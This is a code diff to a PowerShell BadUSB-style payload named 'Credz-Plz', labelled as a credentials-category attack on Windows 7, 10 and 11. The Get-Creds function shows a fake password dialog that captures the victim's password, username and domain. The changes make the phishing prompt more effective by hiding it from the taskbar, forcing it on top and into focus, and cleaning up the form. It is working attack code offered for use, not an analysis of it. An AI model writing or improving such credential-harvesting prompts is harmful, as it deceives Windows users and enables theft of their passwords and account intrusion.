@@ -2,7 +2,7 @@
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
 # Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
 # Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.1               |  | |  | (_| | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Version      : 1.2               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
 # Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
 # Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
@@ -68,6 +68,7 @@ function Get-Creds {
             $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
             $form.MaximizeBox = $false
             $form.MinimizeBox = $false
+            $form.ShowInTaskbar = $false
             
             # Message label
             $msgLabel = New-Object System.Windows.Forms.Label
@@ -120,7 +121,14 @@ function Get-Creds {
             $form.CancelButton = $cancelButton
             $form.Controls.Add($cancelButton)
             
-            $form.Add_Shown({$passText.Select()})
+            # Keep form on top and in focus
+            $form.Add_Shown({
+                $form.Activate()
+                $form.TopMost = $true
+                [System.Windows.Forms.SendKeys]::SendWait("")
+                $passText.Select()
+            })
+            
             $result = $form.ShowDialog()
             
             if ($result -eq [System.Windows.Forms.DialogResult]::OK -and -not [string]::IsNullOrWhiteSpace($passText.Text)) {
@@ -130,6 +138,7 @@ function Get-Creds {
                     Domain = ([Environment]::UserDomainName)
                 }
                 $form.Close()
+                $form.Dispose()
                 return $creds
             }
             else {
@@ -137,11 +146,15 @@ function Get-Creds {
                     [System.Windows.Forms.MessageBox]::Show("Password cannot be empty!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Stop) | Out-Null
                 }
                 $form.Close()
+                $form.Dispose()
                 $form = $null
             }
         }
         catch {
-            if ($form) { $form.Close() }
+            if ($form) { 
+                $form.Close()
+                $form.Dispose()
+            }
             Write-Host "Error in credential capture: $_"
             $form = $null
         }
